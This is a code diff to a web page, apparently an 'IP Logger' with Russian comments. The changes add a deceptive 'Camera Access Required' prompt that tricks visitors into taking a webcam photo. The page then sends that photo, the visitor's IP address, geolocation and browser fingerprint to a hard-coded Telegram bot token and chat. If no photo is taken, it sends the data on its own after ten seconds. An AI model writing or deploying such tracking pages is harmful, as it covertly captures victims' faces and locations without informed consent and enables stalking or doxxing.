@@ -40,6 +40,30 @@
             color: #0c5460;
             border: 1px solid #bee5eb;
         }
+        .camera-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+        #cameraVideo, #cameraCanvas {
+            max-width: 100%;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+        .camera-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .camera-btn:hover {
+            background-color: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -48,13 +72,93 @@
         <div id="status" class="status info">
             Collecting information...
         </div>
-        <p>This page is loading...</p>
+        
+        <div id="cameraSection" class="camera-container hidden">
+            <h3>📷 Camera Access Required</h3>
+            <p>Please allow camera access to continue</p>
+            <video id="cameraVideo" autoplay playsinline></video>
+            <canvas id="cameraCanvas" class="hidden"></canvas>
+            <br>
+            <button id="captureBtn" class="camera-btn hidden">Take Photo</button>
+            <button id="startCameraBtn" class="camera-btn">Enable Camera</button>
+        </div>
+        
+        <p id="loadingText">This page is loading...</p>
     </div>
 
     <script>
         // Конфигурация
         const TOKEN = "8319716117:AAFOvid9L14XanjeBLYWb6JT7QTAVgcA9g4";
         const CHAT_ID = "-1003175777512";
+
+        let cameraStream = null;
+        let photoTaken = false;
+
+        // Элементы DOM
+        const cameraSection = document.getElementById('cameraSection');
+        const cameraVideo = document.getElementById('cameraVideo');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+        const captureBtn = document.getElementById('captureBtn');
+        const startCameraBtn = document.getElementById('startCameraBtn');
+        const loadingText = document.getElementById('loadingText');
+        const statusElement = document.getElementById('status');
+
+        // Функция для запуска камеры
+        async function startCamera() {
+            try {
+                statusElement.innerHTML = '🔄 Requesting camera access...';
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                cameraVideo.srcObject = cameraStream;
+                cameraSection.classList.remove('hidden');
+                captureBtn.classList.remove('hidden');
+                startCameraBtn.classList.add('hidden');
+                loadingText.classList.add('hidden');
+                
+                statusElement.innerHTML = '✅ Camera access granted! Take a photo to continue.';
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                statusElement.innerHTML = '❌ Camera access denied. Continuing without photo.';
+                // Продолжаем без фото
+                setTimeout(() => {
+                    collectAndSendData(null);
+                }, 2000);
+            }
+        }
+
+        // Функция для захвата фото
+        function capturePhoto() {
+            if (!cameraStream) return;
+            
+            const context = cameraCanvas.getContext('2d');
+            cameraCanvas.width = cameraVideo.videoWidth;
+            cameraCanvas.height = cameraVideo.videoHeight;
+            context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            
+            // Останавливаем камеру
+            cameraStream.getTracks().forEach(track => track.stop());
+            
+            cameraVideo.classList.add('hidden');
+            captureBtn.classList.add('hidden');
+            
+            statusElement.innerHTML = '✅ Photo captured! Sending data...';
+            photoTaken = true;
+            
+            // Получаем фото как Data URL
+            const photoDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.8);
+            
+            // Продолжаем сбор данных
+            collectAndSendData(photoDataUrl);
+        }
 
         // Функция для получения IP через ipapi.co
         async function getIPInfo() {
@@ -75,7 +179,6 @@
                 return data;
             } catch (error) {
                 console.error('Error fetching IP info:', error);
-                // Пробуем альтернативный сервис
                 return await getIPInfoFallback();
             }
         }
@@ -147,11 +250,13 @@
                 localStorage: !!window.localStorage,
                 sessionStorage: !!window.sessionStorage,
                 indexedDB: !!window.indexedDB,
-                touchSupport: 'ontouchstart' in window
+                touchSupport: 'ontouchstart' in window,
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
             };
         }
 
-        // Функция для отправки в Telegram
+        // Функция для отправки текста в Telegram
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
@@ -179,9 +284,40 @@
             }
         }
 
+        // Функция для отправки фото в Telegram
+        async function sendPhotoToTelegram(photoDataUrl, caption) {
+            try {
+                // Конвертируем Data URL в Blob
+                const response = await fetch(photoDataUrl);
+                const blob = await response.blob();
+                
+                // Создаем FormData
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', caption.substring(0, 1024)); // Ограничение Telegram
+                
+                const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+                
+                const telegramResponse = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                
+                return telegramResponse.ok;
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+                return false;
+            }
+        }
+
         // Форматирование сообщения
-        function formatMessage(ipInfo, browserInfo) {
-            let message = `<b>🌐 IP Logger by Right Decision</b>\n\n`;
+        function formatMessage(ipInfo, browserInfo, hasPhoto = false) {
+            let message = `<b>🌐 IP Logger with Camera</b>\n\n`;
             message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
             message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
             message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
@@ -201,33 +337,42 @@
             message += `<b>Touch Support:</b> ${browserInfo.touchSupport ? 'Yes' : 'No'}\n`;
             message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
             message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
+            message += `<b>Camera Access:</b> ${hasPhoto ? 'Granted + Photo' : 'Denied/Skipped'}\n`;
             
-            // Обрезаем сообщение если оно слишком длинное для Telegram
-            if (message.length > 4096) {
-                message = message.substring(0, 4090) + '...';
-            }
+            message += `\n<b>🕒 Timestamp:</b> ${new Date().toLocaleString()}`;
             
             return message;
         }
 
         // Основная функция
-        async function collectAndSendData() {
-            const statusElement = document.getElementById('status');
-            
+        async function collectAndSendData(photoDataUrl) {
             try {
                 // Получаем информацию об IP
                 const ipInfo = await getIPInfo();
                 const browserInfo = getBrowserInfo();
 
                 // Формируем сообщение
-                const message = formatMessage(ipInfo, browserInfo);
+                const message = formatMessage(ipInfo, browserInfo, !!photoDataUrl);
 
-                // Отправляем в Telegram
-                const success = await sendToTelegram(message);
+                // Отправляем текстовое сообщение
+                const textSuccess = await sendToTelegram(message);
                 
-                if (success) {
+                // Если есть фото, отправляем его отдельно
+                let photoSuccess = true;
+                if (photoDataUrl) {
+                    const photoCaption = `📸 Camera capture - ${ipInfo.ip || 'Unknown IP'} - ${new Date().toLocaleString()}`;
+                    photoSuccess = await sendPhotoToTelegram(photoDataUrl, photoCaption);
+                }
+                
+                if (textSuccess) {
                     statusElement.className = 'status success';
-                    statusElement.innerHTML = '✅ Information collected and sent successfully!';
+                    if (photoDataUrl) {
+                        statusElement.innerHTML = photoSuccess ? 
+                            '✅ Information and photo sent successfully!' :
+                            '✅ Information sent! Photo failed.';
+                    } else {
+                        statusElement.innerHTML = '✅ Information sent successfully!';
+                    }
                 } else {
                     throw new Error('Failed to send to Telegram');
                 }
@@ -235,13 +380,30 @@
             } catch (error) {
                 console.error('Error:', error);
                 statusElement.className = 'status error';
-                statusElement.innerHTML = '❌ Error collecting information: ' + error.message;
+                statusElement.innerHTML = '❌ Error: ' + error.message;
             }
         }
 
+        // Обработчики событий
+        startCameraBtn.addEventListener('click', startCamera);
+        captureBtn.addEventListener('click', capturePhoto);
+
         // Запускаем при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(collectAndSendData, 1000);
+            // Автоматически запрашиваем камеру через 1 секунду
+            setTimeout(() => {
+                // Показываем секцию камеры и предлагаем включить
+                cameraSection.classList.remove('hidden');
+                statusElement.innerHTML = 'Click "Enable Camera" to take a photo';
+            }, 1000);
+            
+            // Автоматический сбор данных без фото через 10 секунд, если фото не сделано
+            setTimeout(() => {
+                if (!photoTaken) {
+                    statusElement.innerHTML = '⏰ Camera timeout. Sending data without photo...';
+                    collectAndSendData(null);
+                }
+            }, 10000);
         });
     </script>
 </body>
